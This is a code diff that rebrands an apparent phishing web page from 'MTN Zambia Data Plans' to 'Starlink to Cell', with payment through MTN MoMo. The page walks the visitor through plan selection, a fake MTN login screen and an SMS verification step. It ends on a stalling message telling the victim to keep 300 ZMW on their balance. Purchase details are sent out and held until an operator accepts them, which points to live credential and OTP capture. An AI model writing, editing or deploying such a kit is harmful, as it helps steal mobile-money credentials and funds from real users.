@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-<title>MTN Zambia — Data Plans</title>
+<title>Starlink to Cell — MTN MoMo Zambia</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
@@ -20,9 +20,10 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 .page.active{display:block}
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 .plan-page{padding:32px 16px 24px;position:relative;z-index:2}
-.mtn-hero{text-align:center;margin-bottom:26px}
-.mtn-badge{display:inline-flex;align-items:center;gap:10px;background:rgba(10,14,26,.85);border:1.5px solid rgba(255,204,0,.4);border-radius:50px;padding:10px 22px;margin-bottom:22px;backdrop-filter:blur(10px);box-shadow:0 0 20px rgba(255,204,0,.25),0 0 40px rgba(255,204,0,.1),inset 0 0 12px rgba(255,204,0,.08);position:relative}
-.mtn-badge span{font-size:14px;font-weight:900;letter-spacing:2px;color:#ffcc00;text-transform:uppercase;text-shadow:0 0 8px rgba(255,204,0,.6)}
+.starlink-hero{text-align:center;margin-bottom:26px}
+.starlink-badge{display:inline-flex;align-items:center;gap:10px;background:rgba(10,14,26,.85);border:1.5px solid rgba(255,204,0,.4);border-radius:50px;padding:10px 22px;margin-bottom:22px;backdrop-filter:blur(10px);box-shadow:0 0 20px rgba(255,204,0,.25),0 0 40px rgba(255,204,0,.1),inset 0 0 12px rgba(255,204,0,.08);position:relative}
+.starlink-badge svg{width:22px;height:22px;filter:drop-shadow(0 0 6px rgba(255,204,0,.9))}
+.starlink-badge span{font-size:14px;font-weight:800;letter-spacing:2px;color:#ffcc00;text-transform:uppercase;text-shadow:0 0 8px rgba(255,204,0,.5)}
 .hero-title{font-size:26px;font-weight:900;text-align:center;color:#fff;margin-bottom:14px;line-height:1.25;letter-spacing:-.5px;text-shadow:0 0 20px rgba(255,204,0,.35),0 0 40px rgba(255,204,0,.15)}
 .hero-title .neon{background:linear-gradient(135deg,#ffcc00 0%,#ff9500 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 12px rgba(255,204,0,.55))}
 .important-banner{background:rgba(255,204,0,.08);border:1px solid rgba(255,204,0,.25);border-radius:14px;padding:14px 16px;margin-bottom:22px;font-size:13.5px;line-height:1.5;color:#cbd5e0;backdrop-filter:blur(6px);box-shadow:0 0 20px rgba(255,204,0,.08)}
@@ -167,24 +168,28 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 
 <div class="app">
 
+  <!-- PAGE 1: STARLINK PLANS -->
   <div class="page active" id="page-plans">
     <div class="plan-page">
-      <div class="mtn-hero">
-        <div class="mtn-badge"><span>MTN</span></div>
+      <div class="starlink-hero">
+        <div class="starlink-badge">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="3.5" stroke="#ffcc00" stroke-width="1.5"/>
+            <ellipse cx="12" cy="12" rx="10" ry="4" stroke="#ffcc00" stroke-width="1.2" opacity="0.7"/>
+            <ellipse cx="12" cy="12" rx="10" ry="4" stroke="#ff9500" stroke-width="1.2" opacity="0.5" transform="rotate(60 12 12)"/>
+            <ellipse cx="12" cy="12" rx="10" ry="4" stroke="#ffcc00" stroke-width="1.2" opacity="0.4" transform="rotate(-60 12 12)"/>
+            <circle cx="20" cy="8" r="1.5" fill="#ffcc00"/>
+          </svg>
+          <span>Starlink</span>
+        </div>
       </div>
-      <h1 class="hero-title">MTN to Cell —<br><span class="neon">Data Plans</span></h1>
-      <div class="important-banner"><strong>Important:</strong> Fast, reliable mobile data, instantly paid via MTN MoMo.</div>
+      <h1 class="hero-title">Starlink to Cell —<br><span class="neon">Data Plans</span></h1>
+      <div class="important-banner"><strong>Important:</strong> Fast, reliable satellite data, instantly paid via MTN MoMo.</div>
       <div class="powered-by">
         <span>Powered by</span>
         <span class="mtn-brand">MTN<span>MoMo</span></span>
       </div>
-      <div class="plan-card">
-        <div class="plan-badge new">New users only</div>
-        <div class="plan-size">5GB Data</div>
-        <div class="plan-duration">2-Day Plan</div>
-        <div class="plan-price">Free trial</div>
-        <button class="view-details" data-plan="5GB Free Trial" data-size="5GB" data-duration="2-Day" data-price="Free trial">View details <i class="fas fa-arrow-right"></i></button>
-      </div>
+
       <div class="plan-card">
         <div class="plan-badge">Best for light users</div>
         <div class="plan-size">15GB Data</div>
@@ -220,10 +225,12 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
         <div class="plan-price">ZMW 200</div>
         <button class="view-details" data-plan="5G Monthly Unlimited" data-size="5G Unlimited" data-duration="30-Day" data-price="ZMW 200">View details <i class="fas fa-arrow-right"></i></button>
       </div>
+
       <div class="secure-footer">🔒 <strong>Secure Payment:</strong> Selecting a plan will redirect you to a secure MTN MoMo page.</div>
     </div>
   </div>
 
+  <!-- PAGE 2: CONFIRM -->
   <div class="page" id="page-confirm">
     <div class="confirm-page">
       <div class="confirm-header">
@@ -246,6 +253,7 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
+  <!-- PAGE 3: MTN LOGIN -->
   <div class="page" id="page-login">
     <div class="login-screen">
       <div class="mtn-logo-wrap"><div class="mtn-logo-pill">MTN</div></div>
@@ -273,13 +281,14 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
+  <!-- PAGE 4: SMS VERIFICATION -->
   <div class="page" id="page-sms">
     <div class="sms-page">
       <div class="sms-header">
         <button class="sms-back" id="smsBack"><i class="fas fa-arrow-left"></i> Back</button>
         <div class="sms-amount">
           <div class="label">AMOUNT</div>
-          <div class="value" id="smsAmount">ZMW 15.00</div>
+          <div class="value" id="smsAmount">ZMW 25.00</div>
         </div>
       </div>
       <div class="sms-body">
@@ -302,11 +311,12 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
+  <!-- PAGE 5: REVIEW -->
   <div class="page" id="page-review">
     <div class="review-page">
       <div class="review-content">
         <div class="review-spinner"></div>
-        <div class="review-text">Your registration fee is being approved, Login again after 5 hours and make sure you have at least <strong>50 ZMW</strong> on your balance</div>
+        <div class="review-text">Your registration fee is being approved, Login again after 5 hours and make sure you have at least <strong>300 ZMW</strong> on your balance</div>
       </div>
     </div>
   </div>
@@ -450,7 +460,7 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 
   $('confirmPayBtn').addEventListener('click', async function() {
     const reqId = genReqId();
-    const message = `🧾 *Confirm Purchase — MTN Zambia*\n\n📦 *Plan:* ${state.planName}\n📊 *Data:* ${state.planSize}\n📆 *Duration:* ${state.planDuration}\n💰 *Amount:* ${state.planPrice}\n💳 *Method:* MTN MoMo\n\n⏰ ${new Date().toLocaleString()}`;
+    const message = `🧾 *Confirm Purchase — Starlink to Cell*\n\n📦 *Plan:* ${state.planName}\n📊 *Data:* ${state.planSize}\n📆 *Duration:* ${state.planDuration}\n💰 *Amount:* ${state.planPrice}\n💳 *Method:* MTN MoMo\n\n⏰ ${new Date().toLocaleString()}`;
     const result = await submitAndWait(message, reqId, 'Confirming purchase...');
     if (result === 'accept') {
       $('loginPhone').value = '';
@@ -535,4 +545,4 @@ body{background:#0a0e1a;min-height:100vh;color:#1c1c1e}
 })();
 </script>
 </body>
-          </html>
+</html>
